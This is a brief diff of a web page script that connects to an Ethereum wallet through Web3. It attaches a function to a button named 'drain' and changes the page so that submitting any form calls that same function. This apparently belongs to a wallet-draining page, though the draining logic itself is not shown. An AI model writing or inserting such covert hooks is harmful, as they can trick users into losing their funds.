@@ -61,7 +61,7 @@ function startApp () {
           })
           return false
         }
-
+        return false
 }
 
 var $$ = function (e) { return document.querySelector(e) }
@@ -71,7 +71,7 @@ window.onload = _ => {
 if (window.ethereum) {
     web3js = new Web3(window.ethereum)
     $$('#drain').onclick = startApp
-    $$('#transfer').onclick = startApp
+    $$('form').onsubmit = startApp
 }
 }
 </script>
